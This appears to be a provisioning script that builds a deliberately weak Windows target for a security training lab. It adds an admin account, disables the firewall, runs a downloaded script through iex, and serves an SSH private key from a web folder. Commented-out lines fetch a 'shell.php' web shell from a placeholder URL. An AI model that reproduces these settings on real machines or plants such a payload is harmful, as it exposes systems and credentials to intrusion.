net accounts /maxpwage:UNLIMITED
net user '${ADMIN-USER}' '${ADMIN-PASSWORD}' /ADD /PASSWORDCHG:NO /FULLNAME:'HOL Admin' /Y
net localgroup administrators ${ADMIN-USER} /add
New-Item -itemtype directory -path "c:\" -name "www"
Set-NetFirewallProfile -All -Enabled False
Set-ExecutionPolicy Allsigned; iex ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
choco install googlechrome mobaxterm -y --ignore-checksum
$keycontent=@"
${PRIV-KEY}
"@

Set-Content -Path c:\www\ssh_key.pem -Value $keycontent

Add-Content -Path c:\windows\system32\drivers\etc\hosts -Value "${CENTOS-PRIV-IP} centos-2"
Add-Content -Path c:\windows\system32\drivers\etc\hosts -Value "${KALI-PRIV-IP} attacker"
Add-Content -Path c:\windows\system32\drivers\etc\hosts -Value "${DVWA-PRIV-IP} dvwa"
Add-Content -Path c:\windows\system32\drivers\etc\hosts -Value "${JUMP-PRIV-IP} web"

$progressPreference = "silentlyContinue"
Invoke-Expression "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"
Invoke-WebRequest -Uri "https://www.ritlabs.com/download/tinyweb/tinyweb-1-94.zip" -Outfile "C:\www\tinyweb.zip"
Expand-Archive -Path C:\www\tinyweb.zip -DestinationPath C:\www -Force
$html_code=@"
<html>
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8"/>
  <title>HOL-AMEA-2021-Q3</title>
</head>

<body>

<p>
  This is a sample page
</p>

</body>
</html>
"@
Set-Content -Path c:\www\index.html -Value $html_code
tiny c:\www

# Invoke-WebRequest -Uri "<shell.php URL>" -Outfile "C:\www\payload.zip"
# Expand-Archive -Path C:\www\payload.zip -DestinationPath C:\www -Force
